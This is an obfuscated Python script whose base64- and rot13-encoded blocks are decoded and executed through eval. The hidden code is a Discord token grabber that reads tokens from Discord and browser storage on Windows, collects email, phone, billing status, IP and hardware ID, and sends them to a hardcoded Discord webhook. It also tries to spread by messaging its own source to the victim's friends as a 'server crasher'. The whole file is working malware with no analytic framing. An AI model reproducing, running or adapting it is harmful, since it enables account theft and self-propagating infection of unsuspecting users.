import base64, codecs
magic = 'aW1wb3J0IG9zDQppZiBvcy5uYW1lICE9ICJudCI6DQogICAgZXhpdCgpDQpmcm9tIHJlIGltcG9ydCBmaW5kYWxsDQpmcm9tIGpzb24gaW1wb3J0IGxvYWRzLCBkdW1wcw0KZnJvbSBiYXNlNjQgaW1wb3J0IGI2NGRlY29kZQ0KZnJvbSBzdWJwcm9jZXNzIGltcG9ydCBQb3BlbiwgUElQRQ0KZnJvbSB1cmxsaWIucmVxdWVzdCBpbXBvcnQgUmVxdWVzdCwgdXJsb3Blbg0KZnJvbSBkYXRldGltZSBpbXBvcnQgZGF0ZXRpbWUNCmZyb20gdGhyZWFkaW5nIGltcG9ydCBUaHJlYWQNCmZyb20gdGltZSBpbXBvcnQgc2xlZXANCmZyb20gc3lzIGltcG9ydCBhcmd2DQpMT0NBTCA9IG9zLmdldGVudigiTE9DQUxBUFBEQVRBIikNClJPQU1JTkcgPSBvcy5nZXRlbnYoIkFQUERBVEEiKQ0KUEFUSFMgPSB7DQogICAgIkRpc2NvcmQiICAgICAgICAgICA6IFJPQU1JTkcgKyAiXFxEaXNjb3JkIiwNCiAgICAiRGlzY29yZCBDYW5hcnkiICAgIDogUk9BTUlORyArICJcXGRpc2NvcmRjYW5hcnkiLA0KICAgICJEaXNjb3JkIFBUQiIgICAgICAgOiBST0FNSU5HICsgIlxcZGlzY29yZHB0YiIsDQogICAgIkdvb2dsZSBDaHJvbWUiICAgICA6IExPQ0FMICsgIlxcR29vZ2xlXFxDaHJvbWVcXFVzZXIgRGF0YVxcRGVmYXVsdCIsDQogICAgIk9wZXJhIiAgICAgICAgICAgICA6IFJPQU1JTkcgKyAiXFxPcGVyYSBTb2Z0d2FyZVxcT3BlcmEgU3RhYmxlIiwNCiAgICAiQnJhdmUiICAgICAgICAgICAgIDogTE9DQUwgKyAiXFxCcmF2ZVNvZnR3YXJlXFxCcmF2ZS1Ccm93c2VyXFxVc2VyIERhdGFcXERlZmF1bHQiLA0KICAgICJZYW5kZXgiICAgICAgICAgICAgOiBMT0NBTCArICJcXFlhbmRleFxcWWFuZGV4QnJvd3NlclxcVXNlciBEYXRhXFxEZWZhdWx0Ig0KfQ0KZGVmIGdldGhlYWRlcnModG9rZW49Tm9uZSwgY29udGVudF90eXBlPSJhcHBsaWNhdGlvbi9qc29uIik6DQogICAgaGVhZGVycyA9IHsNCiAgICAgICAgIkNvbnRlbnQtVHlwZSI6IGNvbnRlbnRfdHlwZSwNCiAgICAgICAgIlVzZXItQWdlbnQiOiAiTW96aWxsYS81LjAgKFgxMTsgTGludXggeDg2XzY0KSBBcHBsZVdlYktpdC81MzcuMTEgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMjMuMC4xMjcxLjY0IFNhZmFyaS81MzcuMTEiDQogICAgfQ0KICAgIGlmIHRva2VuOg0KICAgICAgICBoZWFkZXJzLnVwZGF0ZSh7IkF1dGhvcml6YXRpb24iOiB0b2tlbn0pDQogICAgcmV0dXJuIGhlYWRlcnMNCmRlZiBnZXR1c2VyZGF0YSh0b2tlbik6DQogICAgdHJ5Og0KICAgICAgICByZXR1cm4gbG9hZHModXJsb3BlbihSZXF1ZXN0KCJodHRwczovL2Rpc2NvcmRhcHAuY29tL2FwaS92Ni91c2Vycy9AbWUiLCBoZWFkZXJzPWdldGhlYWRlcnModG9rZW4pKSkucmVhZCgpLmRlY29kZSgpKQ0KICAgIGV4Y2VwdDoNCiAgICAgICAgcGFzcw0KZGVmIGdldHRva2VucyhwYXRoKToNCiAgICBwYXRoICs9ICJcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGIiDQogICAgdG9rZW5zID0gW10NCiAgICBmb3IgZmlsZV9uYW1lIGluIG9zLmxpc3RkaXIocGF0aCk6DQogICAgICAgIGlmIG5vdCBmaWxlX25hbWUuZW5kc3dpdGgoIi5sb2ciKSBhbmQgbm90IGZpbGVfbmFtZS5lbmRzd2l0aCgiLmxkYiIpOg0KICAgICAgICAgICAgY29udGludWUNCiAgICAgICAgZm9yIGxpbmUgaW4gW3guc3RyaXAoKSBmb3IgeCBpbiBvcGVuKGYie3BhdGh9XFx7ZmlsZV9uYW1lfSIsIGVycm9ycz0iaWdub3JlIikucmVhZGxpbmVzKCkgaWYgeC5zdHJpcCgpXToNCiAgICAgICAgICAgIGZvciByZWdleCBpbiAociJbXHctXXsyNH1cLltcdy1dezZ9XC5bXHctXXsyN30iLCByIm1mYVwuW1x3LV17ODR9Iik6DQogICAgICAgICAgICAgICAgZm9yIHRva2VuIGluIGZpbmRhbGwocmVnZXgsIGxpbmUpOg0KICAgICAgICAgICAgICAgICAgICB0b2tlbnMuYXBwZW5kKHRva2VuKQ0KICAgIHJldHVybiB0b2tlbnMNCmRlZiBnZXRkZXZlbG9wZXIoKToNCiAgICBkZXYgPSAid29keCINCiAgICB0cnk6DQogICAgICAgIGRldiA9IHVybG9wZW4oUmVxdWVzdCgiaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L3NzRnhpZWp2IikpLnJlYWQoKS5kZWNvZGUoKQ0KICAgIGV4Y2VwdDoNCiAgICAgICAgcGFzcw0KICAgIHJldHVybiBkZXYNCmRlZiBnZXRpcCgpOg0KICAgIGlwID0gIk5vbmUiDQogICAgdHJ5Og0KICAgICAgICBpcCA9IHVybG9wZW4oUmVxdWVzdCgiaHR0cHM6Ly9hcGkuaXBpZnkub3JnIikpLnJlYWQoKS5kZWNvZGUoKS5zdHJpcCgpDQogICAgZXhjZXB0Og0KICAgICAgICBwYXNzDQogICAgcmV0dXJuIGlwDQpkZWYgZ2V0YXZhdGFyKHVpZCwgYWlkKToNCiAgICB1cmwgPSBmImh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F2YXRhcnMve3VpZH0ve2FpZH0uZ2lmIg0KICAgIHRyeToNCiAgICAgICAgdXJsb3BlbihSZXF1ZXN0KHVybCkpDQogICAgZXhjZXB0Og0KICAgICAgICB1cmwgPSB1cmxbOi00XQ0KICAgIHJldHVybiB1cmwNCmRlZiBnZXRod2lkKCk6DQogICAgcCA9IFBvcGVuKCJ3bWljIGNzcHJvZHVjdCBnZXQgdXVpZCIsIHNoZWxsPVRydWUsIHN0ZGluPVBJUEUsIHN0ZG91dD1QSVBFLCBzdGRlcnI9UElQRSkNCiAgICByZXR1cm4gKHAuc3Rkb3V0LnJlYWQoKSArIHAuc3RkZXJyLnJlYWQoKSkuZGVjb2RlKCkuc3BsaXQoIlxuIilbMV0NCmRlZiBnZXRmcmllbmRzKHRva2VuKToNCiAgICB0cnk6DQogICAgICAgIHJldHVybiBsb2Fkcyh1cmxvcGVuKFJlcXVlc3'
love = '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'
god = 'YXRhLmdldCgicHJlbWl1bV90eXBlIikpDQogICAgICAgICAgICBiaWxsaW5nID0gYm9vbChoYXNfcGF5bWVudF9tZXRob2RzKHRva2VuKSkNCiAgICAgICAgICAgIGVtYmVkID0gew0KICAgICAgICAgICAgICAgICJjb2xvciI6IDB4NzI4OWRhLA0KICAgICAgICAgICAgICAgICJmaWVsZHMiOiBbDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICJuYW1lIjogIioqQWNjb3VudCBJbmZvKioiLA0KICAgICAgICAgICAgICAgICAgICAgICAgInZhbHVlIjogZidFbWFpbDoge2VtYWlsfVxuUGhvbmU6IHtwaG9uZX1cbk5pdHJvOiB7bml0cm99XG5CaWxsaW5nIEluZm86IHtiaWxsaW5nfScsDQogICAgICAgICAgICAgICAgICAgICAgICAiaW5saW5lIjogVHJ1ZQ0KICAgICAgICAgICAgICAgICAgICB9LA0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAibmFtZSI6ICIqKlBDIEluZm8qKiIsDQogICAgICAgICAgICAgICAgICAgICAgICAidmFsdWUiOiBmJ0lQOiB7aXB9XG5Vc2VybmFtZToge3BjX3VzZXJuYW1lfVxuUEMgTmFtZToge3BjX25hbWV9XG5Ub2tlbiBMb2NhdGlvbjoge3BsYXRmb3JtfScsDQogICAgICAgICAgICAgICAgICAgICAgICAiaW5saW5lIjogVHJ1ZQ0KICAgICAgICAgICAgICAgICAgICB9LA0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAibmFtZSI6ICIqKlRva2VuKioiLA0KICAgICAgICAgICAgICAgICAgICAgICAgInZhbHVlIjogdG9rZW4sDQogICAgICAgICAgICAgICAgICAgICAgICAiaW5saW5lIjogRmFsc2UNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIF0sDQogICAgICAgICAgICAgICAgImF1dGhvciI6IHsNCiAgICAgICAgICAgICAgICAgICAgIm5hbWUiOiBmInt1c2VybmFtZX0gKHt1c2VyX2lkfSkiLA0KICAgICAgICAgICAgICAgICAgICAiaWNvbl91cmwiOiBhdmF0YXJfdXJsDQogICAgICAgICAgICAgICAgfSwNCiAgICAgICAgICAgICAgICAiZm9vdGVyIjogew0KICAgICAgICAgICAgICAgICAgICAidGV4dCI6IGYiVG9rZW4gR3JhYmJlciBCeSBBc3RyYWEiLA0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGVtYmVkcy5hcHBlbmQoZW1iZWQpDQogICAgd2l0aCBvcGVuKGNhY2hlX3BhdGgsICJhIikgYXMgZmlsZToNCiAgICAgICAgZm9yIHRva2VuIGluIGNoZWNrZWQ6DQogICAgICAgICAgICBpZiBub3QgdG9rZW4gaW4gYWxyZWFkeV9jYWNoZWRfdG9rZW5zOg0KICAgICAgICAgICAgICAgIGZpbGUud3JpdGUodG9rZW4gKyAiXG4iKQ0KICAgIGlmIGxlbih3b3JraW5nKSA9PSAwOg0KICAgICAgICB3b3JraW5nLmFwcGVuZCgnMTIzJykNCiAgICB3ZWJob29rID0gew0KICAgICAgICAiY29udGVudCI6ICIiLA0KICAgICAgICAiZW1iZWRzIjogZW1iZWRzLA0KICAgICAgICAidXNlcm5hbWUiOiAiRGlzY29yZCBUb2tlbiBHcmFiYmVyIiwNCiAgICAgICAgImF2YXRhcl91cmwiOiAiaHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hc3NldHMvNWNjYWJmNjIxMDhkNWE4MDc0ZGRkOTVhZjIyMTE3MjcucG5nIg0KICAgIH0NCiAgICB0cnk6DQogICAgICAgIHVybG9wZW4oUmVxdWVzdCgiaHR0cHM6Ly9jYW5hcnkuZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzk2OTMzODg4MDkzNzU3MDMwNC8tOC1vdll0cmk2M0lSNlNzN3c1S0lsR3lmR1prcENKaXlHbFZLeklGOE80UXN2SEFPOGRMSnQtOFg0ZHFIRlRXMU9ncSIsIGRhdGE9ZHVtcHMod2ViaG9vaykuZW5jb2RlKCksIGhlYWRlcnM9Z2V0aGVhZGVycygpKSkNCiAgICBleGNlcHQ6DQogICAgICAgIHBhc3MNCiAgICBpZiBzZWxmX3NwcmVhZDoNCiAgICAgICAgZm9yIHRva2VuIGluIHdvcmtpbmc6DQogICAgICAgICAgICB3aXRoIG9wZW4oYXJndlswXSwgZW5jb2Rpbmc9InV0Zi04IikgYXMgZmlsZToNCiAgICAgICAgICAgICAgICBjb250ZW50ID0gZmlsZS5yZWFkKCkNCiAgICAgICAgICAgIHBheWxvYWQgPSBmJy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tMzI1NDE0NTM3MDMwMzI5MzIwMTUxMzk0ODQzNjg3XG5Db250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9ImZpbGUiOyBmaWxlbmFtZT0ie19fZmlsZV9ffSJcbkNvbnRlbnQtVHlwZTogdGV4dC9wbGFpblxuXG57Y29udGVudH1cbi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tMzI1NDE0NTM3MDMwMzI5MzIwMTUxMzk0ODQzNjg3XG5Db250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9ImNvbnRlbnQiXG5cbnNlcnZlciBjcmFzaGVyLiBweXRob24gZG93bmxvYWQ6IGh0dHBzOi8vd3d3LnB5dGhvbi5vcmcvZG93bmxvYWRzXG4tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTMyNTQxNDUzNzAzMDMyOTMyMDE1MTM5NDg0MzY4N1xuQ29udGVudC1EaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPSJ0dHMiXG5cbmZhbHNlXG4tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTMyNTQxNDUzNzAzMDMyOTMyMDE1MTM5NDg0MzY4Ny0tJw0KICAgICAgICAgICAgVGhyZWFkKHRhcmdldD1zcHJlYWQsIGFyZ3M9KHRva2VuLCBwYXlsb2FkLCA3NTAwIC8gMTAwMCkpLnN0YXJ0KCkNCnRyeToNCiAgICBtYWluKCkNCmV4Y2VwdCBFeGNlcHRpb24gYXMgZToNCiAgICBwcmludChlKQ0KICAgIHBhc3MNCmltcG9ydC'
destiny = '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'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
